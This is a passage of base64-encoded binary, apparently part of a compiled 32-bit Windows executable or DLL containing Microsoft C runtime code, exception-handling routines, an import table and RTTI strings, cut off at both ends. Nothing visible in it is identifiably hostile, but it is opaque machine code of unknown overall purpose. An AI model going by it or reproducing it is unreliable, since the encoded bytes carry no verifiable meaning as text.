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AGMAbwByAGUAZQAuAGQAbABsAAAAAAAAAAUAAMALAAAAAAAAAB0AAMAEAAAAAAAAAJYAAMAEAAAAAAAAAI0AAMAIAAAAAAAAAI4AAMAIAAAAAAAAAI8AAMAIAAAAAAAAAJAAAMAIAAAAAAAAAJEAAMAIAAAAAAAAAJIAAMAIAAAAAAAAAJMAAMAIAAAAAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBCYXNlIENsYXNzIEFycmF5JwAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoACBUeXBlIERlc2NyaXB0b3InAAAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAABgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAABgb21uaSBjYWxsc2lnJwAAIGRlbGV0ZVtdAAAAIG5ld1tdAABgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwBgbG9jYWwgdmZ0YWJsZScAYFJUVEkAAABgRUgAYHVkdCByZXR1cm5pbmcnAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAABgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2YmFzZSBkZXN0cnVjdG9yJwAAYHN0cmluZycAAAAAYGxvY2FsIHN0YXRpYyBndWFyZCcAAAAAYHR5cGVvZicAAAAAYHZjYWxsJwBgdmJ0YWJsZScAAABgdmZ0YWJsZScAAABePQAAfD0AACY9AAA8PD0APj49ACU9AAAvPQAALT0AACs9AAAqPQAAfHwAACYmAAB8AAAAXgAAAH4AAAAoKQAALAAAAD49AAA+AAAAPD0AADwAAAAlAAAALwAAAC0+KgAmAAAAKwAAAC0AAAAtLQAAKysAACoAAAAtPgAAb3BlcmF0b3IAAAAAW10AACE9AAA9PQAAIQAAADw8AAA+PgAAIGRlbGV0ZQAgbmV3AAAAAF9fdW5hbGlnbmVkAF9fcmVzdHJpY3QAAF9fcHRyNjQAX19jbHJjYWxsAAAAX19mYXN0Y2FsbAAAX190aGlzY2FsbAAAX19zdGRjYWxsAAAAX19wYXNjYWwAAAAAX19jZGVjbABfX2Jhc2VkKAAAAAA8CQEQNAkBECgJARAcCQEQEAkBEAQJARD4CAEQ8AgBEOQIARDYCAEQogIBEBwEARAABAEQ7AMBEMwDARCwAwEQ0AgBEMgIARCgAgEQxAgBEMAIARC8CAEQuAgBELQIARCwCAEQpAgBEKAIARCcCAEQmAgBEJQIARCQCAEQjAgBEIgIARCECAEQgAgBEHwIARB4CAEQdAgBEHAIARBsCAEQaAgBEGQIARBgCAEQXAgBEFgIARBUCAEQUAgBEEwIARBICAEQRAgBEEAIARA8CAEQOAgBEDQIARAwCAEQLAgBECgIARAcCAEQEAgBEAgIARD8BwEQ5AcBENgHARDEBwEQpAcBEIQHARBkBwEQRAcBECQHARAABwEQ5AYBEMAGARCgBgEQeAYBEFwGARBMBgEQSAYBEEAGARAwBgEQDAYBEAQGARD4BQEQ6AUBEMwFARCsBQEQhAUBEFwFARA0BQEQCAUBEOwEARDIBAEQpAQBEHgEARBMBAEQMAQBEKICARAuLi4AZC4BEIefABB6nwAQVW5rbm93biBleGNlcHRpb24AAABjc2